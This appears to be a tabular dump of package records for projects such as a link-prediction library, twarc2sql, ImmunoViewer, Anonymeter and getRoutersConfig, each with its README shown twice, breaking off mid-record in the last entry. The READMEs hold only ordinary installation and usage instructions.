| ![cosci](https://avatars.githubusercontent.com/u/44636000?s=421&v=4) | ![vescera](https://avatars.githubusercontent.com/u/10250769?s=421&v=4)| ![fagiolo](https://avatars.githubusercontent.com/u/44865237?v=4) | ![romani](https://avatars.githubusercontent.com/u/44830726?v=4)| ![posta](https://avatars.githubusercontent.com/u/44830740?v=4) 
| - | - | - | - | - |
| [Cristian Cosci](https://github.com/CristianCosci) 🐔 | [Nicolò Vescera](https://github.com/ncvescera) 🦧 | [Fabrizio Fagiolo](https://github.com/F-a-b-r-i-z-i-o) 🐛 |  [Tommaso Romani](https://github.com/TommasoRomani) 🦍 | [Nicolò Posta](https://github.com/NicoloPosta) 🐒

","# **Complex Network Link Prediction**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)   [![Wiki](https://img.shields.io/badge/howTo-Wiki-blue.svg)](https://github.com/Typing-Monkeys/social-network-link-prediction/wiki) [![GitHubIssues](https://img.shields.io/badge/issue_tracking-github-blue.svg)](https://github.com/Typing-Monkeys/social-network-link-prediction/issues) [![GitTutorial](https://img.shields.io/badge/PR-Welcome-%23FF8300.svg?)](https://git-scm.com/book/en/v2/GitHub-Contributing-to-a-Project)


#### **Complex Network Link Prediction** is a python library that implements some of the main techniques and algorithms to perform link predictions.


Check out our [home page](docs link)link pages qui for more information.



This library implemented in python allows you to use some of the main algorithms and methods to perform link predictions. It was designed to carry out these tasks in **Complex Networks** and, specifically, in **Social Networks**. Each method has its own specific documentation available on the following page ---- where it is possible to see the required parameters and the output of the method itself. 
The methods are distinguished by belonging to categories and subcategories, below is an example image with all the categories.



The speed of computation differs both from the type of method and from the input graph. However, for convention and efficiency we have chosen to use the `csr_matrix` sparse matrix structure from the ***scipy*** library in each algorithm.


## Install
```
pip install cnlp
```




## How to use
```python
import networkx as nx
import matplotlib.pyplot as plt
from cnlp.utils import to_adjacency_matrix
from cnlp.probabilistich_methods import stochastic_block_model

G = nx.karate_club_graph()
A = to_adjacency_matrix(G)

res = stochastic_block_model(G, 10)

predicted_edges = []
for u in range(res.shape[0]):
    for v in range(u + 1, res.shape[1]):
        if G.has_edge(u, v):
            continue
        w = res[u, v]
        predicted_edges.append((u, v, w))

# Sort the predicted edges by weight in descending order
predicted_edges.sort(key=lambda x: x[2], reverse=True)

# Print the predicted edges with their weight score
print(""Top Predicted edges:"")
for edge in predicted_edges[:50]:
    print(f""({edge[0]}, {edge[1]}): {edge[2]}"")

nx.draw(G)
plt.show()
```



### Contribute 💥
As there are still many methods to implement and, at the same time, maintaining a library takes up a lot of time, we are always happy to accept new willing and able people to contribute and support our project.

If you want to contribute or you've found a bug, you can open a **Pull Request**.

Check this [tutorial](#https://github.com/Typing-Monkeys/social-network-link-prediction/wiki/monkeflow-Workflow-🦍) if you want to use our preferred *Workflow* 🦍 for developing.

Otherwise you can open a normal Pull Request using `git` and help us to make this project even better!

### Help ❓
If you encounter any bug or you have some problem with this package you can open an [issue](#https://github.com/Typing-Monkeys/social-network-link-prediction/wiki/monkeflow-Workflow-🦍) to report it, we will resolve that asap.



### Building From Source
???

### Dependencies
If your system does not have some or all of this requirements they will be installed during the istallation of this library
- networkx
- scipy
- numpy
ecc



## References

- ***Ajay Kumar, Shashank Sheshar Singh, Kuldeep Singh, Bhaskar Biswas. 2020.***
    [Link prediction techniques, applications, and performance: A survey](https://www.sciencedirect.com/science/article/pii/S0378437120300856)
    *Physica A: Statistical Mechanics and its Applications*,
    ISSN 0378-4371, https://doi.org/10.1016/j.physa.2020.124289.
- ***David Liben-Nowell and Jon Kleinberg. 2003.***
    [The link prediction problem for social networks](https://dl.acm.org/doi/10.1145/956863.956972)
    *In Proceedings of the twelfth international conference on Information and knowledge management (CIKM '03). Association for Computing Machinery, New York, NY, USA*, 556–559, https://doi.org/10.1145/956863.956972.
- ***Víctor Martínez, Fernando Berzal, and Juan-Carlos Cubero. 2016.***
    [A Survey of Link Prediction in Complex Networks](https://dl.acm.org/doi/10.1145/3012704)
    *ACM Comput. Surv. 49, 4, Article 69 (December 2017), 33 pages*. https://doi.org/10.1145/3012704



### ***Authors***

| ![cosci](https://avatars.githubusercontent.com/u/44636000?s=421&v=4) | ![vescera](https://avatars.githubusercontent.com/u/10250769?s=421&v=4)| ![fagiolo](https://avatars.githubusercontent.com/u/44865237?v=4) | ![romani](https://avatars.githubusercontent.com/u/44830726?v=4)| ![posta](https://avatars.githubusercontent.com/u/44830740?v=4) 
| - | - | - | - | - |
| [Cristian Cosci](https://github.com/CristianCosci) 🐔 | [Nicolò Vescera](https://github.com/ncvescera) 🦧 | [Fabrizio Fagiolo](https://github.com/F-a-b-r-i-z-i-o) 🐛 |  [Tommaso Romani](https://github.com/TommasoRomani) 🦍 | [Nicolò Posta](https://github.com/NicoloPosta) 🐒

",typing-monkeys/social-network-link-prediction
dreamai-pdf,https://github.com/HamzaFarhan/dreamai_pdf,111,138,79,"dreamai_pdf
================

<!-- WARNING: THIS FILE WAS AUTOGENERATED! DO NOT EDIT! -->

## Install

``` sh
pip install dreamai_pdf
```
","dreamai_pdf
================



## Install

``` sh
pip install dreamai_pdf
```
",hamzafarhan/dreamai_pdf
twarc2sql,https://github.com/unna97/twarc2sql,36,1656,1656,"=========
twarc2sql
=========

.. image:: https://img.shields.io/pypi/v/twarc2sql.svg
        :target: https://pypi.python.org/pypi/twarc2sql

.. image:: https://readthedocs.org/projects/twarc2sql/badge/?version=latest
        :target: https://twarc2sql.readthedocs.io/en/latest/?version=latest
        :alt: Documentation Status
.. image:: https://github.com/unna97/twarc2sql/actions/workflows/test.yaml/badge.svg
        :target: https://github.com/unna97/twarc2sql/actions/workflows/test.yaml
        :alt: Tests

This package converts jsonl file generated by twarc2 to sql database in an opnionated way.


* Free software: MIT license
* Documentation: https://twarc2sql.readthedocs.io.


Features
--------

*  This package converts jsonl file generated by twarc2 to a postgres sql database in an opnionated way.
* It creates a database with multiple tables that can be found in the documentation & models.py file.

Installation
------------
You can install twarc2sql using pip:

.. code-block:: console

    $ pip install twarc2sql

Usage
-----

.. code-block:: python

        import twarc2sql

        twarc2sql.connect_to_db_and_upload(
            ""folderpath/to/jsonl/file"",
            ""jsonl_file"",
            ""twarc_task_type"",
            ""env_file_with_db_information"",
        )


Credits
-------

This package was created with Cookiecutter_ and the `audreyr/cookiecutter-pypackage`_ project template.

.. _Cookiecutter: https://github.com/audreyr/cookiecutter
.. _`audreyr/cookiecutter-pypackage`: https://github.com/audreyr/cookiecutter-pypackage


=======
History
=======

0.1.0 (2023-03-23)
------------------

* First release on PyPI.
","=========
twarc2sql
=========

.. image:: https://img.shields.io/pypi/v/twarc2sql.svg
        :target: https://pypi.python.org/pypi/twarc2sql

.. image:: https://readthedocs.org/projects/twarc2sql/badge/?version=latest
        :target: https://twarc2sql.readthedocs.io/en/latest/?version=latest
        :alt: Documentation Status
.. image:: https://github.com/unna97/twarc2sql/actions/workflows/test.yaml/badge.svg
        :target: https://github.com/unna97/twarc2sql/actions/workflows/test.yaml
        :alt: Tests

This package converts jsonl file generated by twarc2 to sql database in an opnionated way.


* Free software: MIT license
* Documentation: https://twarc2sql.readthedocs.io.


Features
--------

*  This package converts jsonl file generated by twarc2 to a postgres sql database in an opnionated way.
* It creates a database with multiple tables that can be found in the documentation & models.py file.

Installation
------------
You can install twarc2sql using pip:

.. code-block:: console

    $ pip install twarc2sql

Usage
-----

.. code-block:: python

        import twarc2sql

        twarc2sql.connect_to_db_and_upload(
            ""folderpath/to/jsonl/file"",
            ""jsonl_file"",
            ""twarc_task_type"",
            ""env_file_with_db_information"",
        )


Credits
-------

This package was created with Cookiecutter_ and the `audreyr/cookiecutter-pypackage`_ project template.

.. _Cookiecutter: https://github.com/audreyr/cookiecutter
.. _`audreyr/cookiecutter-pypackage`: https://github.com/audreyr/cookiecutter-pypackage


=======
History
=======

0.1.0 (2023-03-23)
------------------

* First release on PyPI.
",unna97/twarc2sql
micropython-icm20948,https://github.com/jposada202020/MicroPython_ICM20948,1,1474,1426,"Introduction
============


.. image:: https://readthedocs.org/projects/micropython-icm20948/badge/?version=latest
    :target: https://micropython-icm20948.readthedocs.io/
    :alt: Documentation Status


.. image:: https://img.shields.io/pypi/v/micropython-icm20948.svg
    :target: https://pypi.python.org/pypi/micropython-icm20948
    :alt: PyPi Package

.. image:: https://static.pepy.tech/personalized-badge/micropython-icm20948?period=total&units=international_system&left_color=grey&right_color=blue&left_text=Pypi%20Downloads
    :alt: Total PyPI downloads
    :target: https://pepy.tech/project/micropython-icm20948

.. image:: https://img.shields.io/badge/code%20style-black-000000.svg
    :target: https://github.com/psf/black
    :alt: Code Style: Black

MicroPython Driver for the Accelerometer and Gyro ICM20948 Sensor



Installing from PyPI
=====================

On supported GNU/Linux systems like the Raspberry Pi, you can install the driver locally `from
PyPI <https://pypi.org/project/micropython-icm20948/>`_.
To install for current user:

.. code-block:: shell

    pip3 install micropython-icm20948

To install system-wide (this may be required in some cases):

.. code-block:: shell

    sudo pip3 install micropython-icm20948

To install in a virtual environment in your current project:

.. code-block:: shell

    mkdir project-name && cd project-name
    python3 -m venv .venv
    source .env/bin/activate
    pip3 install micropython-icm20948
","Introduction
============


.. image:: https://readthedocs.org/projects/micropython-icm20948/badge/?version=latest
    :target: https://micropython-icm20948.readthedocs.io/
    :alt: Documentation Status


.. image:: https://img.shields.io/pypi/v/micropython-icm20948.svg
    :target: https://pypi.python.org/pypi/micropython-icm20948
    :alt: PyPi Package

.. image:: https://static.pepy.tech/personalized-badge/micropython-icm20948?period=total&units=international_system&left_color=grey&right_color=blue&left_text=Pypi%20Downloads
    :alt: Total PyPI downloads
    :target: https://pepy.tech/project/micropython-icm20948

.. image:: https://img.shields.io/badge/code%20style-black-000000.svg
    :target: https://github.com/psf/black
    :alt: Code Style: Black

MicroPython Driver for the Accelerometer and Gyro ICM20948 Sensor



Installing from PyPI
=====================

On supported GNU/Linux systems like the Raspberry Pi, you can install the driver locally `from
PyPI `_.
To install for current user:

.. code-block:: shell

    pip3 install micropython-icm20948

To install system-wide (this may be required in some cases):

.. code-block:: shell

    sudo pip3 install micropython-icm20948

To install in a virtual environment in your current project:

.. code-block:: shell

    mkdir project-name && cd project-name
    python3 -m venv .venv
    source .env/bin/activate
    pip3 install micropython-icm20948
",jposada202020/micropython_icm20948
explainability-challenges,https://github.com/inkyubeytor/explainability-challenges,0,590,590,"# explainability-challenges

## Testing

The test suite is executable via the `pytest` package.
First, install `pytest` with 
```bash
pip install pytest
```
Then, install the package locally for development purposes by running
```bash
pip install -e .
```
in the root directory of the project.
Finally, run the test suite with
```bash
pytest
```
To run only fast tests, run
```bash
pytest -m ""not slow""
```

## OS-Specific Issue

For Windows devices, if the script hangs due to `kaleido`, run
```bash
pip uninstall kaleido
pip install kaleido==0.1.0.post1
```
","# explainability-challenges

## Testing

The test suite is executable via the `pytest` package.
First, install `pytest` with 
```bash
pip install pytest
```
Then, install the package locally for development purposes by running
```bash
pip install -e .
```
in the root directory of the project.
Finally, run the test suite with
```bash
pytest
```
To run only fast tests, run
```bash
pytest -m ""not slow""
```

## OS-Specific Issue

For Windows devices, if the script hangs due to `kaleido`, run
```bash
pip uninstall kaleido
pip install kaleido==0.1.0.post1
```
",inkyubeytor/explainability-challenges
immunoviewer,https://github.com/davidvi/ImmunoViewer,7,2509,2509,"# ImmunoViewer

Explore and annotate your multi-channel large TIF files with this user-friendly viewer.

## Table of Contents

* [About ImmunoViewer](#about-immunoviewer)  
* [Installation](#installation)  
    * [Install OpenSlide](#install-openslide)
    * [Install from GitHub](#install-from-github)
    * [Install from pip](#install-from-pip)
* [Usage](#usage)  
    * [Folder structure](#folder-structure)
    * [Generate tiles](#generate-tiles)
    * [Run the viewer](#run-the-viewer)


## About ImmunoViewer

ImmunoViewer is a convenient tool for viewing scanned TIF files, particularly those generated by the Keyence Immuno Fluorescence scanner. The viewer allows you to add annotations to the images and supports multi-channel images by saving channels as separate big TIF files. You can customize the color and signal intensity for each channel. We welcome your suggestions for additional features.

## Installation

### Install OpenSlide

ImmunoViewer requires OpenSlide to generate tiled images (not necessary for the viewer). If you use Conda to install ImmunoViewer, it will automatically install OpenSlide.

To install OpenSlide using a Conda environment, run this command:

```bash
conda install -c conda-forge openslide
```

For installation instructions on other operating systems, visit the OpenSlide download page: [OpenSlide](https://openslide.org/download/)

### Install from github

Ensure that you have also installed OpenSlide.

```bash
git clone https://github.com/davidvi/ImmunoViewer.git
cd ImmunoViewer
python setup.py install
```

### Install from pip 

Ensure that you have also installed OpenSlide.

```bash
pip install ImmunoViewer
```

## Usage

### Folder structure

Organize your TIF files in a folder using one of the following structures:

* data_directory/sample_name/sample_file.tif
* data_directory/project_name/sample_name/sample_file.tif
* data_directory/project_name/sample_name/[ch1.tif, ch2.tif, chN.tif]

### Generate tiles

To generate the tiles, execute the following command:

```bash
ImmunoViewerProcess -t [number of threads] [data_directory]
```

### Run the viewer

To start the viewer, run the following command: 

```bash
ImmunoViewerServer -p [port (default is 5000)] -l [IP address (default = 0.0.0.0)] [data_directory]
```

Now you can navigate to http://[IP address]:[port] in your web browser to access ImmunoViewer.

If you leave the IP address to default (0.0.0.0) and the port is exposed to the network other people can also view your slides.  
","# ImmunoViewer

Explore and annotate your multi-channel large TIF files with this user-friendly viewer.

## Table of Contents

* [About ImmunoViewer](#about-immunoviewer)  
* [Installation](#installation)  
    * [Install OpenSlide](#install-openslide)
    * [Install from GitHub](#install-from-github)
    * [Install from pip](#install-from-pip)
* [Usage](#usage)  
    * [Folder structure](#folder-structure)
    * [Generate tiles](#generate-tiles)
    * [Run the viewer](#run-the-viewer)


## About ImmunoViewer

ImmunoViewer is a convenient tool for viewing scanned TIF files, particularly those generated by the Keyence Immuno Fluorescence scanner. The viewer allows you to add annotations to the images and supports multi-channel images by saving channels as separate big TIF files. You can customize the color and signal intensity for each channel. We welcome your suggestions for additional features.

## Installation

### Install OpenSlide

ImmunoViewer requires OpenSlide to generate tiled images (not necessary for the viewer). If you use Conda to install ImmunoViewer, it will automatically install OpenSlide.

To install OpenSlide using a Conda environment, run this command:

```bash
conda install -c conda-forge openslide
```

For installation instructions on other operating systems, visit the OpenSlide download page: [OpenSlide](https://openslide.org/download/)

### Install from github

Ensure that you have also installed OpenSlide.

```bash
git clone https://github.com/davidvi/ImmunoViewer.git
cd ImmunoViewer
python setup.py install
```

### Install from pip 

Ensure that you have also installed OpenSlide.

```bash
pip install ImmunoViewer
```

## Usage

### Folder structure

Organize your TIF files in a folder using one of the following structures:

* data_directory/sample_name/sample_file.tif
* data_directory/project_name/sample_name/sample_file.tif
* data_directory/project_name/sample_name/[ch1.tif, ch2.tif, chN.tif]

### Generate tiles

To generate the tiles, execute the following command:

```bash
ImmunoViewerProcess -t [number of threads] [data_directory]
```

### Run the viewer

To start the viewer, run the following command: 

```bash
ImmunoViewerServer -p [port (default is 5000)] -l [IP address (default = 0.0.0.0)] [data_directory]
```

Now you can navigate to http://[IP address]:[port] in your web browser to access ImmunoViewer.

If you leave the IP address to default (0.0.0.0) and the port is exposed to the network other people can also view your slides.  
",davidvi/immunoviewer
algorand-vanity,https://github.com/sithladyraven/algorand-vanity,2,1045,1045,"# Algorand Vanity
[![GitHub license](https://img.shields.io/github/license/sithladyraven/algorand-vanity.svg?style=social)](https://github.com/sithladyraven/algorand-vanity/blob/master/LICENSE) [![PyPI version](https://badge.fury.io/py/algorand-vanity.svg)](https://badge.fury.io/py/algorand-vanity) 

Python utility for generating vanity algorand wallet addresses.

## Installing from source
```bash
poetry install
```

## Installing with pip
```bash
pip install algorand-vanity
```

## Usage
```bash
algorand_vanity ADDRESS1 ADDRESS2
```

## Options
Option | Description | Default
--- | --- | ---
--threads, -t {start, end} | Number of threads to use for address generation | # of CPU cores
--filename, -f {start, end} | Filename to output addresses to | vanity_addresses
--location, -l {start, end} | location in address where the vanity string should be found | if not specified then string can be anywhere in the address
vanity | list of vanity addresses to search for **(Must only contain the following characters: A-Z, 2-7)** | required

","# Algorand Vanity
[![GitHub license](https://img.shields.io/github/license/sithladyraven/algorand-vanity.svg?style=social)](https://github.com/sithladyraven/algorand-vanity/blob/master/LICENSE) [![PyPI version](https://badge.fury.io/py/algorand-vanity.svg)](https://badge.fury.io/py/algorand-vanity) 

Python utility for generating vanity algorand wallet addresses.

## Installing from source
```bash
poetry install
```

## Installing with pip
```bash
pip install algorand-vanity
```

## Usage
```bash
algorand_vanity ADDRESS1 ADDRESS2
```

## Options
Option | Description | Default
--- | --- | ---
--threads, -t {start, end} | Number of threads to use for address generation | # of CPU cores
--filename, -f {start, end} | Filename to output addresses to | vanity_addresses
--location, -l {start, end} | location in address where the vanity string should be found | if not specified then string can be anywhere in the address
vanity | list of vanity addresses to search for **(Must only contain the following characters: A-Z, 2-7)** | required

",sithladyraven/algorand-vanity
aws-clipper,https://github.com/kai2nenobu/aws-clipper,1,672,672,"[![PyPI][pypi_badge]][pypi_project] ![PythonVersions][pyversions] ![LICENSE][license_badge] [![CI][actions_status]][ci_workflow]

[pypi_project]: https://pypi.org/project/aws-clipper/
[pypi_badge]: https://img.shields.io/badge/pypi-v0.0.7-orange
[license_badge]: https://img.shields.io/badge/license-MIT-green
[pyversions]: https://img.shields.io/badge/python-3.7%20%7C%203.8%20%7C%203.9%20%7C%203.10%20%7C%203.11-blue
[actions_status]: https://github.com/kai2nenobu/aws-clipper/actions/workflows/ci.yml/badge.svg
[ci_workflow]: https://github.com/kai2nenobu/aws-clipper/actions/workflows/ci.yml

# aws-clipper

`aws-clipper` dumps AWS CLI config from a simple YAML file.
","[![PyPI][pypi_badge]][pypi_project] ![PythonVersions][pyversions] ![LICENSE][license_badge] [![CI][actions_status]][ci_workflow]

[pypi_project]: https://pypi.org/project/aws-clipper/
[pypi_badge]: https://img.shields.io/badge/pypi-v0.0.7-orange
[license_badge]: https://img.shields.io/badge/license-MIT-green
[pyversions]: https://img.shields.io/badge/python-3.7%20%7C%203.8%20%7C%203.9%20%7C%203.10%20%7C%203.11-blue
[actions_status]: https://github.com/kai2nenobu/aws-clipper/actions/workflows/ci.yml/badge.svg
[ci_workflow]: https://github.com/kai2nenobu/aws-clipper/actions/workflows/ci.yml

# aws-clipper

`aws-clipper` dumps AWS CLI config from a simple YAML file.
",kai2nenobu/aws-clipper
anonymeter,https://github.com/statice/anonymeter,21,5151,5151,"# Anonymeter: Unified Framework for Quantifying Privacy Risk in Synthetic Data

`Anonymeter` is a unified statistical framework to jointly quantify different
types of privacy risks in synthetic tabular datasets. `Anonymeter` is equipped
with attack-based evaluations for the **Singling Out**, **Linkability**, and
**Inference** risks, which are the three key indicators of factual anonymization
according to the [Article 29 Working Party](https://ec.europa.eu/justice/article-29/documentation/opinion-recommendation/files/2014/wp216_en.pdf).

A simple explanation of how `Anonymeter` works is provided below. For more details, a throughout
description of the working of the framework and the attack algorithms can be found in the paper
[A Unified Framework for Quantifying Privacy Risk in Synthetic Data](https://arxiv.org/abs/2211.10459).
This work has been accepted at the 23rd Privacy Enhancing Technologies Symposium ([PETS 2023](https://petsymposium.org/cfp23.php)).


In `Anonymeter` each privacy risk is derived from a privacy attacker whose task is to use the synthetic dataset
to come up with a set of *guesses* of the form:
- ""there is only one person with attributes X, Y, and Z"" (singling out)
- ""records A and B belong to the same person"" (linkability)
- ""a person with attributes X and Y also have Z"" (inference)

Each evaluation consists of running three different attacks:
- the ""main"" privacy attack, in which the attacker uses the synthetic data to guess information on records in the original data.
- the ""control"" privacy attack, in which the attacker uses the synthetic data to guess information on records in the control dataset.
- the ""baseline"" attack, which models a naive attacker who ignores the synthetic data and guess randomly.

Checking how many of these guesses are correct, the success rates of the different attacks are measured and used to
derive an estimate of the privacy risk. In particular, the ""control attack"" is used to separate what the attacker
learns from the *utility* of the synthetic data, and what is instead indication of privacy leaks.
The ""baseline attack"" instead functions as a sanity check. The ""main attack"" attack should outperform random
guessing in order for the results to be trusted.


## Setup and installation

Anonymeter requires Python 3.8.x, 3.9.x or 3.10.x installed.

Clone the Anonymeter repository:

```shell
git clone git@github.com:statice/anonymeter.git
```

Install the dependencies:

```shell
cd anonymeter  # if you are not there already
pip install . # Basic dependencies
pip install "".[notebooks]"" # Dependencies to run example notebooks
pip install -e "".[notebooks,dev]"" # Development setup
```

If you experience issues with the installation, we recommend to install
`anonymeter` in a new clean virtual environment.

## Getting started

Check out the example notebook in the `notebooks` folder to start playing around
with `anonymeter`. To run this notebook you would need `jupyter` and some plotting libraries.
This should be installed as part of the `notebooks` dependencies. If you haven't done so, please
install them by executing:

```shell
pip install "".[notebooks]""
```


## Basic usage pattern

For each of the three privacy risks anonymeter provide an `Evaluator` class. The high-level classes `SinglingOutEvaluator`, `LinkabilityEvaluator`, and `InferenceEvaluator` are the only thing that you need to import from `Anonymeter`.

Despite the different nature of the privacy risks they evaluate, these classes have the same interface and are used in the same way. To instantiate the evaluator you have to provide three dataframes: the original dataset `ori` which has been used to generate the synthetic data, the synthetic data `syn`, and a `control` dataset containing original records which have not been used to generate the synthetic data.

Another parameter common to all evaluators is the number of target records to attack (`n_attacks`). A higher number will reduce the statistical uncertainties on the results, at the expense of a longer computation time.

```python
evaluator = *Evaluator(ori: pd.DataFrame,
                       syn: pd.DataFrame,
                       control: pd.DataFrame,
                       n_attacks: int)
```

Once instantiated the evaluation pipeline is executed when calling the `evaluate`, and the resulting estimate of the risk can be accessed using the `risk()` method.

```python
evaluator.evaluate()
risk = evaluator.risk()
```

## Cite this work

If you use anonymeter in your work, we would appreciate citations to the following paper:

""A Unified Framework for Quantifying Privacy Risk in Synthetic Data"", M. Giomi *et al*, PoPETS 2023.

This `bibtex` entry can be used to refer to the paper:

```text
@misc{anonymeter,
  doi = {https://doi.org/10.56553/popets-2023-0055},
  url = {https://petsymposium.org/popets/2023/popets-2023-0055.php},
  journal = {Proceedings of Privacy Enhancing Technologies Symposium},
  year = {2023},
  author = {Giomi, Matteo and Boenisch, Franziska and Wehmeyer, Christoph and Tasnádi, Borbála},
  title = {A Unified Framework for Quantifying Privacy Risk in Synthetic Data},
}
```
","# Anonymeter: Unified Framework for Quantifying Privacy Risk in Synthetic Data

`Anonymeter` is a unified statistical framework to jointly quantify different
types of privacy risks in synthetic tabular datasets. `Anonymeter` is equipped
with attack-based evaluations for the **Singling Out**, **Linkability**, and
**Inference** risks, which are the three key indicators of factual anonymization
according to the [Article 29 Working Party](https://ec.europa.eu/justice/article-29/documentation/opinion-recommendation/files/2014/wp216_en.pdf).

A simple explanation of how `Anonymeter` works is provided below. For more details, a throughout
description of the working of the framework and the attack algorithms can be found in the paper
[A Unified Framework for Quantifying Privacy Risk in Synthetic Data](https://arxiv.org/abs/2211.10459).
This work has been accepted at the 23rd Privacy Enhancing Technologies Symposium ([PETS 2023](https://petsymposium.org/cfp23.php)).


In `Anonymeter` each privacy risk is derived from a privacy attacker whose task is to use the synthetic dataset
to come up with a set of *guesses* of the form:
- ""there is only one person with attributes X, Y, and Z"" (singling out)
- ""records A and B belong to the same person"" (linkability)
- ""a person with attributes X and Y also have Z"" (inference)

Each evaluation consists of running three different attacks:
- the ""main"" privacy attack, in which the attacker uses the synthetic data to guess information on records in the original data.
- the ""control"" privacy attack, in which the attacker uses the synthetic data to guess information on records in the control dataset.
- the ""baseline"" attack, which models a naive attacker who ignores the synthetic data and guess randomly.

Checking how many of these guesses are correct, the success rates of the different attacks are measured and used to
derive an estimate of the privacy risk. In particular, the ""control attack"" is used to separate what the attacker
learns from the *utility* of the synthetic data, and what is instead indication of privacy leaks.
The ""baseline attack"" instead functions as a sanity check. The ""main attack"" attack should outperform random
guessing in order for the results to be trusted.


## Setup and installation

Anonymeter requires Python 3.8.x, 3.9.x or 3.10.x installed.

Clone the Anonymeter repository:

```shell
git clone git@github.com:statice/anonymeter.git
```

Install the dependencies:

```shell
cd anonymeter  # if you are not there already
pip install . # Basic dependencies
pip install "".[notebooks]"" # Dependencies to run example notebooks
pip install -e "".[notebooks,dev]"" # Development setup
```

If you experience issues with the installation, we recommend to install
`anonymeter` in a new clean virtual environment.

## Getting started

Check out the example notebook in the `notebooks` folder to start playing around
with `anonymeter`. To run this notebook you would need `jupyter` and some plotting libraries.
This should be installed as part of the `notebooks` dependencies. If you haven't done so, please
install them by executing:

```shell
pip install "".[notebooks]""
```


## Basic usage pattern

For each of the three privacy risks anonymeter provide an `Evaluator` class. The high-level classes `SinglingOutEvaluator`, `LinkabilityEvaluator`, and `InferenceEvaluator` are the only thing that you need to import from `Anonymeter`.

Despite the different nature of the privacy risks they evaluate, these classes have the same interface and are used in the same way. To instantiate the evaluator you have to provide three dataframes: the original dataset `ori` which has been used to generate the synthetic data, the synthetic data `syn`, and a `control` dataset containing original records which have not been used to generate the synthetic data.

Another parameter common to all evaluators is the number of target records to attack (`n_attacks`). A higher number will reduce the statistical uncertainties on the results, at the expense of a longer computation time.

```python
evaluator = *Evaluator(ori: pd.DataFrame,
                       syn: pd.DataFrame,
                       control: pd.DataFrame,
                       n_attacks: int)
```

Once instantiated the evaluation pipeline is executed when calling the `evaluate`, and the resulting estimate of the risk can be accessed using the `risk()` method.

```python
evaluator.evaluate()
risk = evaluator.risk()
```

## Cite this work

If you use anonymeter in your work, we would appreciate citations to the following paper:

""A Unified Framework for Quantifying Privacy Risk in Synthetic Data"", M. Giomi *et al*, PoPETS 2023.

This `bibtex` entry can be used to refer to the paper:

```text
@misc{anonymeter,
  doi = {https://doi.org/10.56553/popets-2023-0055},
  url = {https://petsymposium.org/popets/2023/popets-2023-0055.php},
  journal = {Proceedings of Privacy Enhancing Technologies Symposium},
  year = {2023},
  author = {Giomi, Matteo and Boenisch, Franziska and Wehmeyer, Christoph and Tasnádi, Borbála},
  title = {A Unified Framework for Quantifying Privacy Risk in Synthetic Data},
}
```
",statice/anonymeter
antibodyomics-test,https://github.com/drewschaub/antibodyomics,0,247,247,"# antibodyomics

## Backend

I'm using setuptools, but other options were Hatchling, Flit and PDM

https://packaging.python.org/en/latest/tutorials/packaging-projects/


## Action Items

1. I need to add the required packages to `pyproject.toml` 
","# antibodyomics

## Backend

I'm using setuptools, but other options were Hatchling, Flit and PDM

https://packaging.python.org/en/latest/tutorials/packaging-projects/


## Action Items

1. I need to add the required packages to `pyproject.toml` 
",drewschaub/antibodyomics
evaluateqa,https://github.com/MihailSalnikov/EvaluateQA,4,623,623,"[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

# EvaluateQA

Package for evaluate QA datasets and Leaderboard with SOTA approaches

## Install

```bash
pip install evaluateqa
```

## Supported datasets


### [Mintaka: A Complex, Natural, and Multilingual Dataset for End-to-End Question Answering](https://github.com/amazon-science/mintaka)

```python
from evaluateqa.mintaka import evaluate

predictions = {
    '9ace9041': 'Q90',
    '9ace9042': 3,
    ...
}

results = evaluate(
    predictions,
    split='test',
    mode='kg',
    lang='en',
)
```



","[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

# EvaluateQA

Package for evaluate QA datasets and Leaderboard with SOTA approaches

## Install

```bash
pip install evaluateqa
```

## Supported datasets


### [Mintaka: A Complex, Natural, and Multilingual Dataset for End-to-End Question Answering](https://github.com/amazon-science/mintaka)

```python
from evaluateqa.mintaka import evaluate

predictions = {
    '9ace9041': 'Q90',
    '9ace9042': 3,
    ...
}

results = evaluate(
    predictions,
    split='test',
    mode='kg',
    lang='en',
)
```



",mihailsalnikov/evaluateqa
getroutersconfig,https://github.com/DanielRicklin/getRoutersConfig,2,3639,3639,"[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/netmiko.svg)](https://img.shields.io/pypi/pyversions/netmiko)

# What it does ?
This return Cisco configuration and information like :
 - Sytem informations
 - Static routes
 - Interfaces
 - DHCP

# Informations
bastion_ip and bastion_port are optional

# Get system informations
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

system_information = router.getSystemInformation()
```

The Schema is :
```json
{
    ""serie"": ""C870"",
    ""version"": ""12.4(24)T4"",
    ""hostname"": ""HomeC871"",
    ""uptime"": {
        ""years"": 0,
        ""weeks"": 0,
        ""days"": 2,
        ""hours"": 2,
        ""minutes"": 44
}
```

# Get static routes
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

static_routes = router.getStaticRoutes()
```

The Schema is :
```json
[
    {
        ""subnet_address"": ""1.1.1.1"",
        ""mask"": {
        ""octets"": ""255.255.255.255"",
        ""cidr"": 29
        },
        ""vrf"": ""TEST"",
        ""gateway"": ""2.2.2.2"",
        ""metric"": 250,
        ""tag"": 408,
        ""permanent"": ""false"",
        ""name"": ""the description"",
        ""track"": 20
    },
    ...
]
```

# Get interfaces
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

interfaces = router.getInterfaces()
```

The Schema is :
```json

{
    ""switched"": [
        {
          ""name"": ""FastEthernet0"",
          ""switchport_mode"": ""access"",
          ""vlan"": ""1""
        },
        ...
    ],
    ""routed"": [
        {
          ""name"": ""FastEthernet4"",
          ""description"": """",
          ""ip"": ""192.168.1.101"",
          ""mask"": {
            ""octets"": ""255.255.255.0"",
            ""cidr"": 24
          },
          ""vrf"": """"
        },
        ...
    ]
},
```

# Get DHCP
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

dhcp = router.getDhcp()
```

The Schema is :
```json

[
    {
        ""name"": ""DATA"",
